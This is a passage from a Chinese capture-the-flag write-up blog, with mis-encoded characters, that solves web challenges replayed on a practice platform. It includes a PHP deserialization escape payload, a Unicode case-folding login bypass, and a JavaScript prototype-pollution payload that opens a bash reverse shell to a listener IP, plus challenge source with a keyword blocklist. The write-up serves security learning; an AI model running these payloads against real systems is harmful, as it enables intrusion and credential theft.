class="string">"admin"</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯é€ƒé€¸å­—ç¬¦ï¼Œå› æ­¤éœ€è¦ä¿è¯payloadè¿›å…¥ä¹‹åèƒ½ä¿è¯åºåˆ—åŒ–å­—ç¬¦ä¸²èƒ½å¤Ÿæ­£å¸¸ååºåˆ—åŒ–ï¼Œæ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"ggb0n"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">s:</span><span class="number">7</span>:<span class="string">"ggb0n"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„<code>age</code>å’Œ<code>nickname</code>æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠŠpayloadå†™å…¥åˆ°<code>nickname</code>éƒ¨åˆ†ï¼Œç„¶åé€šè¿‡å°†payloadæŒ¤å‡ºå»è¿›è¡Œé€ƒé€¸ï¼Œç”±äºå±æ€§æ˜¯ä¸‰ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨<code>nickname</code>ä¸­å†™å…¥çš„payloadå‰é¢åŠ ä¸€ä¸ª<code>CtrlCase</code>çš„å±æ€§ï¼Œåœ¨æœ€ååŠ ä¸€ä¸ª<code>}</code>ï¼Œå¦‚æ­¤ä»¥æ¥ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šå¿½ç•¥åé¢çš„<code>CtrlCase</code>ï¼Œåˆæ­¥æ„é€ payloadå¦‚ä¸‹ï¼š</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";s:0:"</span><span class="string">";s:8:"</span>nickname<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":8:&#123;s:8:"</span>hostname<span class="string">";s:9:"</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">";s:6:"</span>dbuse<span class="string">r";s:4:"</span>root<span class="string">";s:6:"</span>dbpass<span class="string">";s:4:"</span>root<span class="string">";s:8:"</span>database<span class="string">";s:4:"</span>test<span class="string">";s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";N;s:6:"</span>mysqli<span class="string">";N;s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>ä¸‹ä¸€æ­¥æˆ‘ä»¬å°±éœ€è¦æŠŠpayloadé€ƒé€¸å‡ºå»ï¼šç”±äºpayloadä¸€å…±<code>454</code>ä¸ªå­—ç¬¦ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ é»‘åå•ä¸­çš„å†…å®¹ï¼Œé€šè¿‡æ›¿æ¢ä¸º<code>hacker</code>æŠŠpayloadæŒ¤å‡ºå»ï¼Œé€šè¿‡<code>safe()</code>å‡½æ•°æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œä¸€ä¸ª<code>&#39;</code>æ›¿æ¢ä¸º<code>hacker</code>å¯ä»¥æ›¿æ¢æŒ¤å‡º5ä¸ªå­—ç¬¦ï¼Œä¸€ä¸ª<code>union</code>æ›¿æ¢ä¸º<code>hacker</code>å¯ä»¥æŒ¤å‡º1ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆåœ¨payloadå‰é¢åŠ ä¸Š90ä¸ª<code>&#39;</code>å’Œ4ä¸ª<code>union</code>å°±å¯ä»¥æŠŠ454ä¸ªå­—ç¬¦çš„payloadæŒ¤å‡ºå»äº†ï¼Œæ„é€ æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age&#x3D;&amp;nickname&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡POSTæ–¹å¼ï¼Œå°†payloadæ‰“å…¥<code>update.php</code>å³å¯æ‹¿åˆ°ç»è¿‡md5åŠ å¯†ä¹‹åçš„passwordï¼Œè§£å¯†å³å¯ã€‚<br>æœ¬é“é¢˜æ˜¯åœ¨BUUå¤ç°çš„ï¼Œå¯†ç å·²ç»è¢«æ”¹ä¸ºäº†<code>glzjin</code>äº†ï¼Œç™»å½•å³å¯æ‹¿flagã€‚</p><p>è¡¥å……ï¼šsmityå¸ˆå‚…ç»™äº†ä¸€ä¸ªå¾ˆè¯¦ç»†çš„é¢˜è§£ï¼Œå¯ä»¥å¥½å¥½å­¦å­¦è¿™é¢˜ï¼š<a href="https://www.anquanke.com/post/id/200200">è¿™é‡Œ</a>ã€‚</p><h2 id="Ez-Express"><a href="#Ez-Express" class="headerlink" title="Ez_Express"></a>Ez_Express</h2><p>è€ƒå¯ŸJSåŸå‹é“¾æ±¡æŸ“ï¼ŒJSä¹‹å‰æ²¡å­¦è¿‡ï¼Œåœ¨BUUä¸Šå¤ç°çš„è¿‡ç¨‹ä¸­æ…¢æ…¢å­¦äº†ä¸€äº›ï¼Œå…³äºJSåŸå‹é“¾çš„æ±¡æŸ“å‚è€ƒ<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">Pç¥çš„æ–‡ç« </a>ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-5"><a href="#é¢˜ç›®åˆ†æ-5" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ï¼Œå¯ä»¥çœ‹åˆ°ä¸€äº›æç¤ºï¼š<br><img src="http://ggb0n.cool/images/gyctf5.png" alt=""></p><p>è¦æ±‚æˆ‘ä»¬å¿…é¡»ä»¥<code>ADMIN</code>ç™»å½•ï¼Œä½†æ˜¯è¿™ä¸ªç”¨æˆ·åˆæ³¨å†Œä¸äº†â€¦</p><p>dirsearchæ‰«åå°å¯ä»¥å‘ç°<a href="http://www.zipçš„å­˜åœ¨ï¼ŒæŠŠæºç æ‹¿ä¸‹æ¥ï¼Œçœ‹çœ‹å…¶ä¸­çš„ç„æœºã€‚">www.zipçš„å­˜åœ¨ï¼ŒæŠŠæºç æ‹¿ä¸‹æ¥ï¼Œçœ‹çœ‹å…¶ä¸­çš„ç„æœºã€‚</a></p><p>åœ¨<code>index.js</code>ä¸­çš„<code>login</code>è·¯ç”±ä¸‹å‘ç°çªç ´ç‚¹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.body.Submit==<span class="string">"register"</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">'user'</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">'passwd'</span>: req.body.pwd,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">'/'</span>); </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ³¨å†Œçš„æ—¶å€™å­˜åœ¨<code>toUpperCase()</code>çš„ä½¿ç”¨ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯å­˜åœ¨å¯åˆ©ç”¨çš„æ¼æ´çš„ï¼Œå³åˆ©ç”¨ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç»•è¿‡ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">toUpperCase():</span><br><span class="line">Ä± ==&gt; I</span><br><span class="line">Å¿ ==&gt; S</span><br></pre></td></tr></table></figure><p>å¦å¤–JSä¸­çš„<code>toLowerCase()</code>å‡½æ•°ä¹Ÿå­˜åœ¨å¯¹ç‰¹æ®Šå­—ç¬¦çš„ä¸è§„èŒƒå¤„ç†ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">toLowerCase():</span><br><span class="line">Ä° ==&gt; i</span><br><span class="line">â„ª ==&gt; k</span><br></pre></td></tr></table></figure><p>æ ¹æ®å¦‚ä¸Šç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>admÄ±n</code>èº«ä»½è¿›è¡Œæ³¨å†Œï¼Œç»è¿‡<code>toUpperCase()</code>å¤„ç†ä¾¿æˆäº†<code>ADMIN</code>ä»è€ŒæˆåŠŸç™»å½•ï¼š<br><img src="http://ggb0n.cool/images/gyctf1.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæç¤ºäº†flagçš„ä½ç½®ï¼Œåº”è¯¥å°±éœ€è¦RCEæ¥è¿›è¡Œè¯»å–äº†ã€‚</p><p>å†å®¡ä»£ç ï¼Œå‘ç°<code>index.js</code>ä¸­å­˜åœ¨<code>merge</code>å’Œ<code>clone</code>ï¼Œæ ¹æ®åœ¨å‰é¢æåˆ°çš„Pç¥çš„æ–‡ç« ä¸­çš„å­¦ä¹ ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯JSåŸå‹é“¾æ±¡æŸ“ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›ä¸€æ­¥åœ¨<code>action</code>è·¯ç”±ä¸‹å‘ç°äº†<code>clone</code>çš„ä½¿ç”¨ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">"ADMIN"</span>)&#123;res.end(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>æ˜¯å°†<code>req</code>è¯·æ±‚ä¸­çš„å†…å®¹æ‹¼æ¥åˆ°<code>session</code>çš„è¿‡ç¨‹ï¼Œæ˜¾ç„¶ï¼Œ<code>req.body</code>æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæ˜¯è€ƒå¯ŸåŸå‹é“¾æ±¡æŸ“æ²¡é”™äº†ã€‚</p><p><code>action</code>è·¯ç”±æ˜¯å•¥æ—¶å€™è®¿é—®çš„å‘¢ï¼Ÿå…¶å®å°±æ˜¯æäº¤è¾“å…¥çš„åœ°æ–¹ï¼š<br><img src="http://ggb0n.cool/images/gyctf.png" alt=""></p><h3 id="è§£é¢˜-6"><a href="#è§£é¢˜-6" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ä½†æ˜¯æ€ä¹ˆæ‰èƒ½å®ç°åŸå‹é“¾çš„æ±¡æŸ“å‘¢ï¼Ÿçœ‹åˆ°<code>info</code>è·¯ç”±ä¸‹å‡ºç°äº†<code>outputFunctionName</code>ï¼Œå‚è€ƒå¦ä¸€ç¯‡<a href="https://lethe.site/2019/09/11/ByteCTF-2019-XNUCA-2019%E9%83%A8%E5%88%86web%E9%A2%98%E5%A4%8D%E7%8E%B0/#xnuca-2019-hardjs-1">æ–‡ç« </a>ï¼Œè®²äº†åˆ©ç”¨<code>outputFunctionName</code>è¿›è¡Œæ±¡æŸ“çš„æ–¹å¼ï¼Œpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>:&#123;<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¤§è‡´å«ä¹‰å°±æ˜¯ï¼š</p><blockquote><p>åˆ©ç”¨å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼Œå‘ç±»çš„åŸå‹å¯¹è±¡<code>prototype</code>ä¸­å†™å…¥ä¸€ä¸ªæ–°çš„å±æ€§å’Œå±æ€§å€¼ï¼Œå³<code>outputFunctionName</code>å’Œå¯¹åº”çš„å€¼ï¼Œå¦‚æ­¤ä»¥æ¥ï¼Œè¯¥ç±»å°±å­˜åœ¨äº†è¿™ä¸ªå±æ€§ï¼Œå®ä¾‹åŒ–çš„æ—¶å€™ä¹Ÿä¼šç»§æ‰¿ï¼Œå› æ­¤å½“æˆ‘ä»¬å†å»è®¿é—®<code>info</code>è·¯ç”±çš„æ—¶å€™<code>res.outputFunctionName</code>çš„å€¼å·²ç»æ˜¯æˆ‘ä»¬å†™å…¥çš„payloadä¸­çš„RCEéƒ¨åˆ†çš„å†…å®¹äº†ï¼Œä»è€Œå³å¯åœ¨VPSä¸Šåå¼¹shellã€‚</p></blockquote><p>ç”±äºæ˜¯åœ¨BUUä¸Šå¤ç°çš„ï¼Œå¼€ä¸€å°å†…ç½‘ä¸»æœºï¼Œæ‹¿åˆ°ipä¹‹åæ„é€ payloadï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>:&#123;<span class="string">"outputFunctionName"</span>:<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/174.1.33.241/8899 0&gt;&amp;1\"');var __tmp2"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶åœ¨è¯¥å†…ç½‘ä¸»æœºä¸Šè¿›è¡Œç›‘å¬ï¼Œåœ¨è®¿é—®<code>action</code>è·¯ç”±çš„æ—¶å€™æŠ“åŒ…æ›´æ”¹<code>Content-Type</code>ä¸º<code>application/json</code>ï¼Œå¹¶å°†æˆ‘ä»¬å¦‚ä¸Šæ„é€ çš„payloadå†™å…¥ï¼š<br><img src="http://ggb0n.cool/images/gyctf2.png" alt=""></p><p>å‰é¢å°±æ±¡æŸ“äº†åŸå‹é“¾äº†ï¼Œç„¶åè®¿é—®<code>info</code>è·¯ç”±è¿›è¡Œå‘½ä»¤çš„æ‰§è¡Œï¼š<br><img src="http://ggb0n.cool/images/gyctf3.png" alt=""></p><p>ä»è€Œæ‹¿åˆ°shellï¼š<br><img src="http://ggb0n.cool/images/gyctf4.png" alt=""></p><p>ç„¶åå°±å¯ä»¥éšä¾¿è¯»å–æ–‡ä»¶ï¼Œæ‹¿åˆ°flagäº†ã€‚</p><p>æœ‰å…³JSçš„é¢˜ç›®å…¶å®æ²¡æ€ä¹ˆåšè¿‡ï¼Œå› ä¸ºè¿˜æ²¡æœ‰ä¸“é—¨å­¦è¿‡JSï¼Œä½†æ˜¯JSç¡®å®è¶Šæ¥ç”¨çš„è¶Šå¤šï¼Œé¢˜ä¹Ÿä¸å°‘ï¼Œå¾ˆæœ‰å­¦çš„å¿…è¦ã€‚</p><h2 id="Node-Game"><a href="#Node-Game" class="headerlink" title="Node Game"></a>Node Game</h2><p>åˆæ˜¯ä¸€é“JSçš„é¢˜ï¼Œè€ƒå¯Ÿ<code>CRLFæ³¨å…¥</code>ã€SSRF</p><p>CRLFæ³¨å…¥å‚è€ƒ<a href="https://www.cnblogs.com/uestc2007/p/10880338.html">è¿™é‡Œ</a>ï¼š</p><blockquote><p>CRLFæ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸ºWebåº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€äº›æ¶æ„å­—ç¬¦ã€‚æ”»å‡»è€…ä¸€æ—¦å‘è¯·æ±‚è¡Œæˆ–é¦–éƒ¨ä¸­çš„å­—æ®µæ³¨å…¥æ¶æ„çš„CRLFï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›é¦–éƒ¨å­—æ®µæˆ–æŠ¥æ–‡ä¸»ä½“ï¼Œå¹¶åœ¨å“åº”ä¸­è¾“å‡ºï¼Œæ‰€ä»¥åˆç§°ä¸ºHTTPå“åº”æ‹†åˆ†æ¼æ´ï¼ˆHTTP Response Splittingï¼‰ã€‚</p></blockquote><h3 id="é¢˜ç›®åˆ†æ-6"><a href="#é¢˜ç›®åˆ†æ-6" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®å³å¯æ‹¿åˆ°æºç ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>); <span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">'./dist'</span>&#125;).array(<span class="string">'file'</span>));</span><br><span class="line">app.use(morgan(<span class="string">'short'</span>));</span><br><span class="line">app.use(<span class="string">"/uploads"</span>,express.static(path.join(__dirname, <span class="string">'/uploads'</span>)))</span><br><span class="line">app.use(<span class="string">"/template"</span>,express.static(path.join(__dirname, <span class="string">'/template'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//SSRF</span></span><br><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/template/source.txt'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;error occurs!&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Example app listening at http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç å¾—çŸ¥å‡ ä¸ªè·¯ç”±çš„ç”¨å¤„ï¼š</p><blockquote><p>1ã€ /ï¼šä¼šåŒ…å«/templateç›®å½•ä¸‹çš„ä¸€ä¸ªpugæ¨¡æ¿æ–‡ä»¶æ¥ç”¨pubè¿›è¡Œæ¸²æŸ“ï¼›</p><p>2ã€/sourceï¼šå›æ˜¾æºç 